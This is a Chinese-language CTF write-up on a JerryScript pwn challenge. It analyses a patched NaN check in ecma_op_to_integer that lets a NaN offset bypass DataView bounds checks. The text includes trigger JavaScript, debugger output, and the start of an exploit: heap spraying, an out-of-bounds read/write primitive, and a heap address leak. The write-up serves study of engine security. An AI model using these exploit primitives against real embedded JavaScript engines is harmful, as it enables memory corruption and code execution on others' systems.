#  JerryScript引擎ecma_op_to_index漏洞分析与越界读写利用  
flyyyy
                    flyyyy  看雪学苑   2026-02-06 09:59  
  
听说第八届“强网”拟态防御国际精英挑战赛一道 JerryScript 的 Pwn 题，  
抽空尝试做了一下。当时构造出 8 字节的越界读写后，一直  
尝试利用，但由于 GC 的原因一直没有成功，时间比较短，如果再多些时间应该也是可以利用成功的。  
  
  
不过在调试过程中，了解了该引擎的一些机制，发现相比 v8 还是简单很多的。赛后与其他师傅交流，才发现原来可以通过 Patch 中的漏洞实现任意长度的越界读写。因此尝试复现了一下，诞生了这篇 writeup。  
  
  
**题目信息**  
  
  
  
  
题目给了几个程序运行的链接库，看了下版本是Ubuntu GLIBC 2.39-0ubuntu8.6，由于我本地位wsl2 ubuntu22版本，所以patch了一下。  
  
  
查看jerryscript的版本信息  
  
```
➜  jerry ./jerry --version                                Version: 3.0.0 (b7069350)
```  
  
  
  
接着本地编译一个，最后会看到build/bin目录下有一个jerry的可执行文件  
  
```
git clone https://github.com/jerryscript-project/jerryscript.gitcd jerryscriptgit checkout b7069350patch -p1 < ../patchpython tools/build.py --debug --lto=off
```  
  
  
**前置知识**  
  
  
  
## 类型系统类型的定义位于这个文件中 jerryscript/jerry-core/ecma/base/ecma-globals.h  
  
ecma_object_t是类型header的开始部分，其中主要的字段有type、gc_next_cp、u1、u2。  
  
  
其中的u1和u2分别代表properties和prototype相关，不是每一个对象都有这两个字段。  
  
```
typedef struct{/** type : 4 bit : ecma_object_type_t or ecma_lexical_environment_type_t                     depending on ECMA_OBJECT_FLAG_BUILT_IN_OR_LEXICAL_ENV      flags : 2 bit : ECMA_OBJECT_FLAG_BUILT_IN_OR_LEXICAL_ENV,                      ECMA_OBJECT_FLAG_EXTENSIBLE or ECMA_OBJECT_FLAG_BLOCK      refs : 10 / 26 bit (max 1022 / 67108862) */ecma_object_descriptor_t type_flags_refs;/** next in the object chain maintained by the garbage collector */jmem_cpointer_t gc_next_cp;/** compressed pointer to property list or bound object */union  {jmem_cpointer_t property_list_cp; /**< compressed pointer to object's                                       *   or declerative lexical environments's property list */jmem_cpointer_t bound_object_cp; /**< compressed pointer to lexical environments's the bound object */jmem_cpointer_t home_object_cp; /**< compressed pointer to lexical environments's the home object */  } u1;/** object prototype or outer reference */union  {jmem_cpointer_t prototype_cp; /**< compressed pointer to the object's prototype  */jmem_cpointer_t outer_reference_cp; /**< compressed pointer to the lexical environments's outer reference  */  } u2;} ecma_object_t;
```  
  
  
  
type_flags_refs中的Type就指的是类型，但是并不像v8那样细分为object arr、double arr……  
  
  
其中的refs，这个对于利用的稳定性比较重要，如果产生了越界，可以通过修改这个字段不让改对象被gc回收，从而保持布局的稳定性。  
> 然后笔者在实际利用过程中并没有这样，当时没有意识到，回头翻看源码的时候才发现。所以采用了人为构造函数进行ref，增加ref count  
  
  
下面是一个简单的图示  
  
```
|31 ......................... 6 |5 ......4 |3 ........ 0 ||          Reference Count       |    Flags   |Type     ||(26 bits)|(2 bits)|(4 bits)|
```  
  
  
  
接着的gc_next_cp是用于gc回收时扫描对象而设立的字段，u1与properties相关，在受限的情况下，可以采用修改和这个字段的方式进行类型混淆，u2和原型链有关，暂时也没想到这个怎么用。  
> 笔者尝试过，当时由于稳定性的原因，没有构造出很好用的原语，等待后续研究……  
  
  
下面是 ecma_extended_object_t 结构体  
  
```
typedef struct{ecma_object_t object; /**< object header *//**   * Description of extra fields. These extra fields depend on the object type.   */union  {ecma_built_in_props_t built_in; /**< built-in object part *//**     * Description of objects with class.     *     * Note:     *     class is a reserved word in c++, so cls is used instead     */struct    {uint8_t type; /**< class type of the object *//**       * Description of 8 bit extra fields. These extra fields depend on the type.       */union      {uint8_t arguments_flags; /**< arguments object flags */uint8_t error_type; /**< jerry_error_t type of native error objects */#if JERRY_BUILTIN_DATEuint8_t date_flags; /**< flags for date objects */#endif /* JERRY_BUILTIN_DATE */#if JERRY_MODULE_SYSTEMuint8_t module_state; /**< Module state */#endif /* JERRY_MODULE_SYSTEM */uint8_t iterator_kind; /**< type of iterator */uint8_t regexp_string_iterator_flags; /**< flags for RegExp string iterator */uint8_t promise_flags; /**< Promise object flags */#if JERRY_BUILTIN_CONTAINERuint8_t container_flags; /**< container object flags */#endif /* JERRY_BUILTIN_CONTAINER */#if JERRY_BUILTIN_TYPEDARRAYuint8_t array_buffer_flags; /**< ArrayBuffer flags */uint8_t typedarray_type; /**< type of typed array */#endif /* JERRY_BUILTIN_TYPEDARRAY */      } u1;/**       * Description of 16 bit extra fields. These extra fields depend on the type.       */union      {uint16_t formal_params_number; /**< for arguments: formal parameters number */#if JERRY_MODULE_SYSTEMuint16_t module_flags; /**< Module flags */#endif /* JERRY_MODULE_SYSTEM */uint16_t iterator_index; /**< for %Iterator%: [[%Iterator%NextIndex]] property */uint16_t executable_obj_flags; /**< executable object flags */#if JERRY_BUILTIN_CONTAINERuint16_t container_id; /**< magic string id of a container */#endif /* JERRY_BUILTIN_CONTAINER */#if JERRY_BUILTIN_TYPEDARRAYuint16_t typedarray_flags; /**< typed array object flags */#endif /* JERRY_BUILTIN_TYPEDARRAY */      } u2;/**       * Description of 32 bit / value. These extra fields depend on the type.       */union      {ecma_value_t value; /**< value of the object (e.g. boolean, number, string, etc.) */ecma_value_t target; /**< [[ProxyTarget]] or [[WeakRefTarget]] internal property */#if JERRY_BUILTIN_TYPEDARRAYecma_value_t arraybuffer; /**< for typedarray: ArrayBuffer reference */#endif /* JERRY_BUILTIN_TYPEDARRAY */ecma_value_t head; /**< points to the async generator task queue head item */ecma_value_t iterated_value; /**< for %Iterator%: [[IteratedObject]] property */ecma_value_t promise; /**< PromiseCapability[[Promise]] internal slot */ecma_value_t sync_iterator; /**< IteratorRecord [[Iterator]] internal slot for AsyncFromSyncIterator */ecma_value_t spread_value; /**< for spread object: spreaded element */int32_t tza; /**< TimeZone adjustment for date objects */uint32_t length; /**< length related property (e.g. length of ArrayBuffer) */uint32_t arguments_number; /**< for arguments: arguments number */#if JERRY_MODULE_SYSTEMuint32_t dfs_ancestor_index; /**< module dfs ancestor index (ES2020 15.2.1.16) */#endif /* JERRY_MODULE_SYSTEM */      } u3;    } cls;/**     * Description of function objects.     */struct    {jmem_cpointer_tag_t scope_cp; /**< function scope */ecma_value_t bytecode_cp; /**< function byte code */    } function;/**     * Description of array objects.     */struct    {uint32_t length; /**< length property value */uint32_t length_prop_and_hole_count; /**< length property attributes and number of array holes in                                            *   a fast access mode array multiplied ECMA_FAST_ACCESS_HOLE_ONE */    } array;/**     * Description of bound function object.     */struct    {jmem_cpointer_tag_t target_function; /**< target function */ecma_value_t args_len_or_this; /**< length of arguments or this value */    } bound_function;/**     * Description of implicit class constructor function.     */struct    {ecma_value_t script_value; /**< script value */uint8_t flags; /**< constructor flags */    } constructor_function;  } u;} ecma_extended_object_t;
```  
  
  
  
简化完毕其实是这样。ecma_object_t object和一个union u  
  
  
其中的object就是上方的通用类型的header，对于复杂类型会使用到ecma_extended_object_t，其中的union u会根据不同的类型选择不同的字段，以此定义不同对象的属性字段。  
  
```
typedef struct{ecma_object_t object; union  {struct    {uint8_t type;   union {uint8_t array_buffer_flags; uint8_t typedarray_type;          } u1;union {uint16_t typedarray_flags;      } u2;union {uint32_t length;        ecma_value_t arraybuffer; ecma_value_t value;           } u3;    } cls;struct    {uint32_t length;                     uint32_t length_prop_and_hole_count;     } array;struct    {jmem_cpointer_tag_t scope_cp;    ecma_value_t bytecode_cp;            } function;struct    {jmem_cpointer_tag_t target_function; ecma_value_t args_len_or_this;           } bound_function;  } u;} ecma_extended_object_t;
```  
  
## 类型调试实例  
> 下面笔者迁移了部分v8 exploit的知识，通过ai写出了一个针对于jerryscript调试的gdb插件，提升了调试的效率  
  
  
这里以dataview为例子  
  
```
let ab = new ArrayBuffer(0x100);let dv = new DataView(ab,0x10,0x20);dv.setUint32(0x00,0x41414141,true);
```  
  
  
  
dataview的定义  
  
```
typedef struct{  ecma_extended_object_t header; /**< header part */  ecma_object_t *buffer_p; /**< [[ViewedArrayBuffer]] internal slot */  uint32_t byte_offset; /**< [[ByteOffset]] internal slot */} ecma_dataview_object_t;
```  
  
  
  
arraybuffer的定义  
  
```
typedef struct{ecma_extended_object_t extended_object; /**< extended object part */void *buffer_p; /**< pointer to the backing store of the array buffer object */void *arraybuffer_user_p; /**< user pointer passed to the free callback */} ecma_arraybuffer_pointer_t;
```  
  
  
  
实际内存中是这样的，后方的0x10是对应的byte_offset。0x64eccc323748是arraybuffer的地址。  
> 注意下方的0x41414141，这里是对应的inline表示，这个并不利于后续的利用，这个是利用的后话了  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1vT1y4icH2kQibvia8oGQibFrm1Xm3y3B8kPbSh6ss7oYxLY4iaubPPmLia6FnTwV6WlNMJfzRoLBKyuhWdzhI8DiaZhPZ93fGC1NqYw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
如何让arraybuffer分配出一个raw pointer呢？这里只需要提高arraybuffer分配的大小即可，我这里提升到了0x1000。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K34iacOuQHmprzWuRucqx6A2G2z1NCzb2KsZeEx2mxRKcXgjhJnMNr9HRwfdBwYtZylmErCn2CI2yibgHV4w1GyP3PhhtWicPsAFk/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
#   
  
**漏洞分析**  
  
  
  
## 代码审计思路  
  
diff的内容  
  
```
diff --git a/jerry-core/ecma/operations/ecma-conversion.c b/jerry-core/ecma/operations/ecma-conversion.cindex cf0c9fde..5c1b7aa2 100644--- a/jerry-core/ecma/operations/ecma-conversion.c+++ b/jerry-core/ecma/operations/ecma-conversion.c@@ -905,7 +905,6 @@ ecma_op_to_integer (ecma_value_t value, /**< ecma value */   /* 3 */   if (ecma_number_is_nan (number))   {-    *number_p = ECMA_NUMBER_ZERO;     return ECMA_VALUE_EMPTY;   }
```  
  
  
  
删去了一个对于nan的检查，定位源码可以找到代码的上下文，调用函数是[A] ecma_op_to_integer，从而可以找到上层的调用上下文分别是[B] ecma_op_to_length和[C] ecma_op_to_index函数。  
  
```
ecma_value_tecma_op_to_integer (ecma_value_t value, /**< ecma value */ecma_number_t *number_p) /**< [out] ecma number */{// [A] ......ecma_number_t number = *number_p;/* 3 */if (ecma_number_is_nan (number))  {return ECMA_VALUE_EMPTY;  } ......ecma_value_tecma_op_to_length (ecma_value_t value, /**< ecma value */ecma_length_t *length) /**< [out] ecma number */{//[B] /* 1 */if (ECMA_IS_VALUE_ERROR (value))  {return value;  }/* 2 */ecma_number_t num;ecma_value_t length_num = ecma_op_to_integer (value, &num); ......ecma_value_tecma_op_to_index (ecma_value_t value, /**< ecma value */ecma_number_t *index) /**< [out] ecma number */{//[C] /* 1. */if (ecma_is_value_undefined (value))  {    *index = 0;return ECMA_VALUE_EMPTY;  }/* 2.a */ecma_number_t integer_index;ecma_value_t index_value = ecma_op_to_integer (value, &integer_index);
```  
  
  
  
接着就是更上层的调用查找，对于ecma_op_to_length来说，更多的是倾向于被字符串和regexp的处理，如果存在漏洞，那么品相也不一定很好，所以我这里继续看了ecma_op_to_index的上层调用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2JOJmS8VLOgSMEYrF2IG8DzP9jC27TbUQ8tQTophszDMiaRFPv4QicrrlW5DHtYl1x34ggpLibOMibYWSGic3DsSQtY8sZ1dLTDAvQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
ecma_op_to_index的上层调用如下，这里可以看到很具有代表意义的两个对象，dataview和typearray，如果熟悉v8 exploit的话，这里两个对象的嫌疑最大 ，事实也确实如此，所以接下来继续审计dataview相关的实现。  
> typearray的代码似乎没有很明显的漏洞，因此主要审计了dataview  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2FKWoyyd7av48lW861icva0E5wvAwvMMqrv0oYPxvKRAUxhWmXHAO6MxQfVGZSjVmicviaFJFibyBEaaDtm8CE91ibeLzoMLszu22o/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
##   
## dataview相关代码审计  
## dataview 与 arraybuffer 对象的结构  
##   
  
首先我们得看一下jerryscript中的dataview对象的结构，所有对象的结果为与这个文件下jerryscript/jerry-core/ecma/base/ecma-globals.h。  
  
  
可以看到使用了ecma_extended_object_t的header，这个是对于复杂对象的header，其中集成了ecma_object_t的内容。接着又一个buffer_p指针，这个其实指向了Arraybuffer，接着是对应的byte_offset，用户索引Arraybuffer中的偏移。  
  
```
#if JERRY_BUILTIN_DATAVIEW/** * Description of DataView objects. */typedef struct{ecma_extended_object_t header; /**< header part */ecma_object_t *buffer_p; /**< [[ViewedArrayBuffer]] internal slot */uint32_t byte_offset; /**< [[ByteOffset]] internal slot */} ecma_dataview_object_t;#endif /* JERRY_BUILTIN_DATAVIEW */
```  
  
  
  
接着看Arraybuffer的对象结构，结构很简单，其中的buffer_p也就类似于v8中的backingstore  
  
```
typedef struct{ecma_extended_object_t extended_object; /**< extended object part */void *buffer_p; /**< pointer to the backing store of the array buffer object */void *arraybuffer_user_p; /**< user pointer passed to the free callback */} ecma_arraybuffer_pointer_t;
```  
  
  
  
接着可以动态的看一下，测试代码入下：  
  
```
let ab = new ArrayBuffer(0x100);let dv = new DataView(ab,0x10);dv.setUint32(0,0x11111111,true);
```  
  
  
  
其中地址0x62e46178e5f0中的dword 0x10就是这里设置的byte_offset  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K03LZPpMeYhfib8QLprObbg74ZHfzNibRFmueNHQtkSefaeYVy1eYmEn1EvajnXDjnbTuWkRxV5zpHC0RbVeXaBo8nqicjZeg5BRo/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
同时dataview还支持这样的语法，也就是会有一个view_offset，下发设置了view_offset为0x10，但是索引了0x20的位置，这个是不合法的，会报错。  
  
```
let ab = new ArrayBuffer(0x100);let dv = new DataView(ab,0x10,0x10);dv.setUint32(0x20,0x11111111,true);// error
```  
  
### dataview中的内存越界  
  
审计代码路径位于jerryscript/jerry-core/ecma/operations/ecma-dataview-object.c  
#### ecma_op_dataview_create  
  
先审计ecma_op_dataview_create这个函数，关于dataview对象的创建，代码如下：  
  
```
ecma_value_tecma_op_dataview_create (constecma_value_t *arguments_list_p, /**< arguments list */uint32_t arguments_list_len) /**< number of arguments */{JERRY_ASSERT (arguments_list_len == 0 || arguments_list_p != NULL);JERRY_ASSERT (JERRY_CONTEXT (current_new_target_p));ecma_value_t buffer = arguments_list_len > 0 ? arguments_list_p[0] : ECMA_VALUE_UNDEFINED;/* 2. */if (!ecma_is_value_object (buffer))  {return ecma_raise_type_error (ECMA_ERR_ARGUMENT_BUFFER_NOT_OBJECT);  }ecma_object_t *buffer_p = ecma_get_object_from_value (buffer);if (!(ecma_object_class_is (buffer_p, ECMA_OBJECT_CLASS_ARRAY_BUFFER)        || ecma_object_is_shared_arraybuffer (buffer_p)))  {return ecma_raise_type_error (ECMA_ERR_ARGUMENT_BUFFER_NOT_ARRAY_OR_SHARED_BUFFER);  }/* 3. */ecma_number_t offset = 0;if (arguments_list_len > 1)  {ecma_value_t offset_value = ecma_op_to_index (arguments_list_p[1], &offset);//[a]if (ECMA_IS_VALUE_ERROR (offset_value))    {return offset_value;    }  }/* 4. */if (ecma_arraybuffer_is_detached (buffer_p))  {return ecma_raise_type_error (ECMA_ERR_ARRAYBUFFER_IS_DETACHED);  }/* 5. */ecma_number_t buffer_byte_length = ecma_arraybuffer_get_length (buffer_p);/* 6. */if (offset > buffer_byte_length)  {return ecma_raise_range_error (ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER);  }/* 7. */uint32_t view_byte_length;if (arguments_list_len > 2 && !ecma_is_value_undefined (arguments_list_p[2]))  {/* 8.a */ecma_number_t byte_length_to_index;ecma_value_t byte_length_value = ecma_op_to_index (arguments_list_p[2], &byte_length_to_index);if (ECMA_IS_VALUE_ERROR (byte_length_value))    {return byte_length_value;    }/* 8.b */if (offset + byte_length_to_index > buffer_byte_length)//[b]    {return ecma_raise_range_error (ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER);    }JERRY_ASSERT (byte_length_to_index <= UINT32_MAX);    view_byte_length = (uint32_t) byte_length_to_index;  }else  {/* 7.a */    view_byte_length = (uint32_t) (buffer_byte_length - offset);  }/* 9. */ecma_object_t *prototype_obj_p =ecma_op_get_prototype_from_constructor (JERRY_CONTEXT (current_new_target_p), ECMA_BUILTIN_ID_DATAVIEW_PROTOTYPE);if (JERRY_UNLIKELY (prototype_obj_p == NULL))  {return ECMA_VALUE_ERROR;  }/* 10. */if (ecma_arraybuffer_is_detached (buffer_p))  {ecma_deref_object (prototype_obj_p);return ecma_raise_type_error (ECMA_ERR_ARRAYBUFFER_IS_DETACHED);  }/* 9. *//* It must happen after 10., because uninitialized object can't be destroyed properly. */ecma_object_t *object_p =ecma_create_object (prototype_obj_p, sizeof (ecma_dataview_object_t), ECMA_OBJECT_TYPE_CLASS);ecma_deref_object (prototype_obj_p);/* 11 - 14. */ecma_dataview_object_t *dataview_obj_p = (ecma_dataview_object_t *) object_p;  dataview_obj_p->header.u.cls.type = ECMA_OBJECT_CLASS_DATAVIEW;  dataview_obj_p->header.u.cls.u3.length = view_byte_length;  dataview_obj_p->buffer_p = buffer_p;  dataview_obj_p->byte_offset = (uint32_t) offset;return ecma_make_object_value (object_p);} /* ecma_op_dataview_create */
```  
  
  
  
这里首先会通过参数列表获取到buffer，这个就是Arraybuffer，接着会检查这个用户传入的Arraybuffer的值是否合法，也就是真实类型是否为Arraybuffer。  
  
  
接着通过参数列表为offset赋值，同时检查是否有问题，可以看到上方[a]处调用了ecma_op_to_index，这个函数涉及到nan的处理，正常遇到nan会将nan清空为0，并返回正常的状态码ECMA_VALUE_EMPTY，但是这里没有清空，所以会正常绕过这个检查，并保留原有的nan的值。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2OQGGvp6CAAXlYHr0FJGy5h6Ic5AAmiaeyXhqFeGfwPYGlUp3fsOJV8PF1BXmpxTkhSGToYic0WVcbribUxic3LCViaaIvW1ldVKzE/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
接着获取Arraybuffer的长度，并赋值给buffer_byte_length。然后进入if (offset > buffer_byte_length)判断。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K10AVPa0Z79q1AnAg6FZ6YvAKrr9ibS7cfInRibGEWrm4uHudlpfm9LR7CKGpwFiaJPV2vdcI65JQ7eFVYaxOhe1YSichInicjya4tE/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
问题其实就出现在这个地方，这里的比较逻辑是将nan的值从栈上取出来，赋值给xmm0，也就是浮点数寄存器，接着调用comisd进行比较。  
  
  
需要注意的在 x86/x64 汇编中，comisd 指令在遇到 NaN 时，如果任一操作数是 NaN，它会设置 ZF=1, PF=1, CF=1，接下来的jbe，它的跳转条件是 CF=1 或 ZF=1，所以这里只要涉及到NaN的比较，这里都会被解释成offset <= length，结果就是绕过这个bound check。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K2ZZ3RdAzMAkNl5UOPlYzUZ9Up3C9r6W5xbYvDuc0X9qEkzVN3nQiaNXricficPmxnRYico74csbIiaCAoTAY9ib4sicNuoBZufuIjPkg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
调试下eflag，没有比较之前是这样  
  
```
pwndbg> info registers eflagseflags         0x206               [ PF IF ]pwndbg> 
```  
  
  
  
比较之后是这样，成功绕过了这个检查  
  
```
pwndbg> info registers eflagseflags         0x247               [ CF PF ZF IF ]pwndbg> 
```  
  
  
  
现在可以得到一个结论，对于这个检查if (offset > buffer_byte_length)  
  
offset = NaN 时，可以直接pass  
  
  
同样的，这个绕过模式还可以传播为(NaN + arb_val > buffer_byte_length)→false，所以我们可以在NaN后面加上任意偏移，这个也就是上方的[b]处，if (offset + byte_length_to_index > buffer_byte_length)  
  
进入[b]处也很简单，参数是三个就行，也就用到了上方的语法。  
  
```
let ab = new ArrayBuffer(0x100);let dv = new DataView(ab,NaN,0xffffffff);
```  
  
  
  
这里，我将view_byte_length设置为0xfffffff，buffer_byte_length仅为0x100，但是由于offset是nan，所以此时的eflag如下，也就绕过了bound check  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0IB5IH4faV3NgfV9DhzCAScgFOP74OGrsGegwhbJ4icz4F9XGIcQU0bSdnAg31GOMxUia25pIaYVXgcib2GzTqPicKucELJES7icEc/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
最终的NaN被类型转化为uint32_t变成0，但是view_byte_length成功赋值为0xffffffff。至此我们已经成功构造了一个存在越界的dataview对象，我们现在需要接着分析对于dataview的get和set操作，看一下是否可以将这个漏洞扩大，变成一个可以越界读写的原语。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K28RcBwiaytcf4qHaj31g7MqCyDwrN7xuzibkEiaIDh2iciaqbI8tKsxDLZh67CwibkCicV94PqibvicJ10y1W5qKEMibPuQrrC2nfHnAQHY/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
#### ecma_op_dataview_get_set_view_value  
  
有了阅读ecma_op_dataview_create的经验，我们其实只需要找这个函数中对于边界检查的部分，通过最后的对象属性赋值部分来验证猜想，所以这个函数的代码被精简如下：  
  
```
ecma_value_tecma_op_dataview_get_set_view_value (ecma_value_t view, /**< the operation's 'view' argument */ecma_value_t request_index, /**< the operation's 'requestIndex' argument */ecma_value_t is_little_endian_value, /**< the operation's                                                                           *   'isLittleEndian' argument */ecma_value_t value_to_set, /**< the operation's 'value' argument */ecma_typedarray_type_t id) /**< the operation's 'type' argument */{/* 1 - 2. */ecma_dataview_object_t *view_p = ecma_op_dataview_get_object (view);if (JERRY_UNLIKELY (view_p == NULL))  {return ECMA_VALUE_ERROR;  }ecma_object_t *buffer_p = view_p->buffer_p;JERRY_ASSERT (ecma_object_class_is (buffer_p, ECMA_OBJECT_CLASS_ARRAY_BUFFER)                || ecma_object_is_shared_arraybuffer (buffer_p));/* 3. */ecma_number_t get_index;ecma_value_t number_index_value = ecma_op_to_index (request_index, &get_index);if (ECMA_IS_VALUE_ERROR (number_index_value))  {return number_index_value;  }........../* GetViewValue 7., SetViewValue 9. */uint32_t view_offset = view_p->byte_offset;/* GetViewValue 8., SetViewValue 10. */uint32_t view_size = view_p->header.u.cls.u3.length;/* GetViewValue 9., SetViewValue 11. */uint8_t element_size = (uint8_t) (1 << (ecma_typedarray_helper_get_shift_size (id)));/* GetViewValue 10., SetViewValue 12. */if (get_index + element_size > (ecma_number_t) view_size)//[a]  {ecma_free_value (value_to_set);return ecma_raise_range_error (ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER);  }if (ECMA_ARRAYBUFFER_LAZY_ALLOC (buffer_p))  {ecma_free_value (value_to_set);return ECMA_VALUE_ERROR;  }if (ecma_arraybuffer_is_detached (buffer_p))  {ecma_free_value (value_to_set);return ecma_raise_type_error (ECMA_ERR_ARRAYBUFFER_IS_DETACHED);  }/* GetViewValue 11., SetViewValue 13. */bool system_is_little_endian = ecma_dataview_check_little_endian ();ecma_typedarray_info_t info;  info.id = id;  info.length = view_size;  info.shift = ecma_typedarray_helper_get_shift_size (id);  info.element_size = element_size;  info.offset = view_p->byte_offset;  info.array_buffer_p = buffer_p;/* GetViewValue 12. */uint8_t *block_p = ecma_arraybuffer_get_buffer (buffer_p) + (uint32_t) get_index + view_offset;..........} /* ecma_op_dataview_get_set_view_value */
```  
  
  
  
构造的调试代码如下，这里是构造了一个dv的越界越界读操作  
  
```
let ab = new ArrayBuffer(0x100);let dv = new DataView(ab,NaN,0xffffffff);dv.getUint32(0x200,true);
```  
  
  
  
首先分析上面的源码  
  
  
注释1-3部分是对于dataview header和arraybuffer header的检查，如果说单纯修改指针，那么这个检查过不去是没用的。  
  
  
接着直接来到上方[a]部分，也就是这里的边界检查if (get_index + element_size > (ecma_number_t) view_size)，这个逻辑很正常，就是检查用户传入的index+取出的elment size是否超过了views_size。  
  
  
但是需要注意的是这里的view_size已经被我们修改成了0xffffffff，所以这里相当于直接绕过了这个检查。  
  
  
下方的getindex是0x200，已经超过了arraybuffer的长度，但是由于view_size被修改，所以越界了，后续就是存值取值的操作。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K0ia5qybrMWDGX3AWbJEUNvXLxdEyQpZbJJSW8eza9jsKzD1nu89d2LOYUEg1a5gjME0pCU6ot3B1PXhZ4X0iclYyCWPJnjw7ViaE/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
#   
  
**漏洞利用**  
  
  
  
  
由于笔者也是第一次接触jerryscript的利用，所以最后的脚本经过大量调试得到，所以笔者这里就解释下写利用的思路。  
## 泄漏jerry_global_heap  
  
我们之前已经得到了一个越界的dv，现在需要思考如何可控。  
  
  
上面提到了可以通过申请0x1000这样length的arraybuffer，这样就可以让arraybuffer不inline表示，从而分配出一个raw pointer。因此可以通过一个越界的dv去读取内存后方arraybuffer中的buffer_p字段，那么现在至少存在了一个jerry heap的地址。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3uPFs6wHHuMOg2jYyL0IsJgXEpOpvVaDT9xQjysfQbnnzRmIUHKCicd3ubeyiaUJpRQkDSpib3HmiaoRjd3pjZXwRyiaqv2BFx9JK4/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
接着的问题是如何去定位这个arraybuffer，首先我需要保证我的越界dv地址在受害arraybuffer的前方，所以需要调试一下，这里发现是没有问题的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K0jDDCxjmFZdnv2q4Y2G4TKD15Q2cEjzP4c2ey1w6EbvSERaHx40bVxPeFZvhGCYqJphlicDo35yJvYQTW5I1P7WtNh3fseKgsw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
最简单的定位思路就是写一个特征值，但问题是这样只能扫描到特征值的位置，我们通过特征值的位置无法定位到arraybuffer指向的位置。像下面红框中一样，只能扫描到这个值，但是无法反推。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3hYL6pbTRgIsvXQInhstlicljgY54q8FhZricZu4AyjQzqAaQibIUeJVXFAx3DBE483Y9icUyDicsqyDqyp3PN17mrBs2NtvhkCZf0/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
解决这个问题就需要思考arraybuffer的特征，arraybuffer的特征由前面的0x10个字节的header决定，下发的四个字段中有type、gc_next、prototype……  
  
```
pwndbg> x/4wx 0x5d89998be7680x5d89998be768 <jerry_global_heap+70888>:  0x22990012  0x016c0000  0x00000319  0x00001000pwndbg> 
```  
  
  
  
因此我选取了Type、ProtoType、ByteLength，这三个字段在我堆喷出来的对象中是一致的，所以我可以通过header的字段来确定受害arraybuffer的位置，那么相邻的就是jerry_global_heap段上的值。  
  
  
可以得到这样的一个leak，通过减去0x11a30可以得到一个段开头的地址，但是这个是随机的，根据你写的脚本和环境决定。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K36U6MQPKduNcvcRL25QHIxYGM7mC4N7OD7qheyOHfprlRia6LR0iaeepylwAf4hIKrFs0vsTwTPBaSicXicUtokheOQibBNicficvXn8/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
所以为了稳定性我进行了如下的计算，最后的情况是在多0x9000和少0x9000的情况下摆动。  
  
```
let ptr_lo = dv.getUint32(target_idx * 8, true);let ptr_hi = dv.getUint32(target_idx * 8 + 4, true);let heap_global_addr = (BigInt(ptr_hi) << 32n) | BigInt(ptr_lo);heap_global_addr = heap_global_addr - 0x11058n;heap_global_addr = heap_global_addr & ~ 0xfffn;// // 题目下发版本的偏移heap_global_addr = heap_global_addr + 0x280n;// heap_global_addr = heap_global_addr - 0x9000n + 0x280n;
```  
  
  
  
可以看到jerry_global_heap起始地址是这个段的开头+0x280  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K36BovibeHTYA1WKibmhianRgJCxejvUxlaF1anJewm3N7ca4a2TD9OQnZ5ibUD8ll5SQlyuH7VXyIxj9W9Rx82skWdBc1RdCsd144/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
同时这个jerry_global_heap开头的一段内存上是存在函数指针的值，所以我们接下来需要思考如何去利用这个jerry_global_heap来泄漏出code_base、libc等值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K34QokGuiaBwPwCxgXQhbjVA7INpUMic1AlHiaFN6h3vB27kTHnQDpFCLQ1X83F0s5hhZ9Snlic12VBKzvxlcmaYMlNNWgmThic0TsQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
## 越界读写转化为任意读写  
  
通过上方的思路，确实定位到了受害arraybuffer的位置，但是由于这里的arraybuffer是堆喷出来的（如下所示），所以我还需要确定这个arrybuffer的具体位置。  
  
```
function inin_dv(arr,arr_length,ab_length){for(let i=0; i<arr_length; i++) {        arr.push(new DataView(new ArrayBuffer(ab_length)));    }for (let i=0; i<arr_length; i++) {        arr[i].setFloat64(0, u64_to_f64(MagicSign), true);     }return arr;}
```  
  
  
  
